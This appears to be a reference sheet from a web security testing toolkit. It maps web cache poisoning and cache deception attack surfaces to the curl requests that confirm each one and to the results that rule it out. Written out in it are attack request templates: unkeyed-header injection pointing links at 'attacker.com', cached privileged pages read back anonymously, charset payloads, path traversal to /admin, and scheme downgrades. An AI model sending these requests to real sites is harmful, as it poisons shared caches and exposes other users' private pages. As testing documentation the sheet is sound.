# Confirm map — every confirm, mapped

The map from the surface to the confirmation and the falsifier.

---

## 1. The unkeyed-input confirm — the clean-request marker

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # store it
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
#   reflected + a HIT → the stored copy serves YOUR input → confirmed
```

```text
falsifier: a keyed input → a per-input entry → the clean request
doesn't reflect → a different class.
```

## 2. The HIT confirm — the stored copy's serve

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # first — MISS
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # second — HIT?
curl -sI "$BASE/page?cb=<unique>" | grep -i 'x-cache'
#   X-Cache-Status: HIT → the stored copy served it
```

## 3. The deception confirm — the wrong-context serve

```bash
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'   # stores the privileged copy
curl "$BASE/settings.html?cb=<unique>"   # the privileged page → deception
#   the anonymous request returns the privileged page (a 200 + the
#   content, not a 302) AND a HIT → confirmed
```

```text
falsifier: a 302 to /login → the cache didn't serve the page → the
auth state WAS keyed → a different class.
```

## 4. The personalized-page confirm — the per-user leak

```bash
curl "$BASE/profile?cb=<unique>" -H 'Cookie: <auth>'   # stores the personalized copy
curl "$BASE/profile?cb=<unique>"   # YOUR session's content → a per-user leak
```

```text
falsifier: a Vary: Cookie → a per-session copy → not a shared one →
a different class.
```

## 5. The host-rewrite confirm — the URL-rewrite

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>" | grep 'attacker.com'   # the stored copy's links carry it
```

## 6. The charset confirm — the charset injection

```bash
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # the stored copy carries it
```

## 7. The path-confusion confirm — the route-rewrite

```bash
curl "$BASE/static/../admin?cb=<unique>"   # the cache stores it under the static key
curl "$BASE/static/../admin?cb=<unique>"   # the stored copy's response is the app's
```

## 8. The scheme confirm — the downgrade

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: http'
curl "$BASE/page?cb=<unique>" | grep -oE 'src="http://[^"]*"'   # the links use http
```

## 9. The per-surface confirm map — which confirm for which surface

```text
an unkeyed input    → the clean-request marker reflects + a HIT
a privileged page   → the anonymous request returns the privileged page
a host-rewrite      → the stored copy's links carry your host
a charset           → the stored copy carries the charset-decoded payload
a path-confusion    → the stored copy's response is the app's
a scheme            → the stored copy's links use your scheme
a per-user leak     → the stored copy serves your session's content
```

## 10. The per-surface falsifier map — which falsifier for which surface

```text
a keyed input       → a per-input entry → a different class
a 302 to login      → a keyed auth → a different class
a Vary: Cookie      → a per-session copy → a different class
a MISS reflection   → a reflection → a different class
a no-cache surface  → no stored copy → a different class
```

## 11. The evidence's three-part confirm — the complete proof

```text
the poison confirm:
1. the probe request STORED — a cache HIT on the second identical request
2. the keyed input left OUT of the cache key — the unkeyed input
3. the reflected value reaching a response the victim receives — the
   clean request reflects the marker
a reflected header on a MISS is not a poisoning.
```

## 12. The confirm's ledger — what to record

```bash
python3 tools/state.py <c> --hypothesis \
  "cache-poison-confirm: input=<unkeyed> — hit=<yes> — marker=<reflected> — key=<cached-parts>"
```
